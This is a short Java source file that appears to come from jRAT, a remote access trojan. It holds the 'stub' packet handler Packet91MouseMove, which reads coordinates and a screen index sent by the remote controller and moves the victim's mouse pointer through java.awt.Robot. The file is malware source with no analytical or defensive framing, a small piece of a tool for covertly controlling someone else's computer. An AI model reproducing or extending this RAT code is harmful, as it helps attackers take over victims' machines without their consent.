package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Main;

public class Packet91MouseMove extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int x = Connection.instance.readInt();
		int y = Connection.instance.readInt();
		int i = Connection.instance.readInt();
		if (i == -1) {
			Main.robot.mouseMove(x, y);
		} else {
			Main.robots[i].mouseMove(x, y);
		}

	}

}
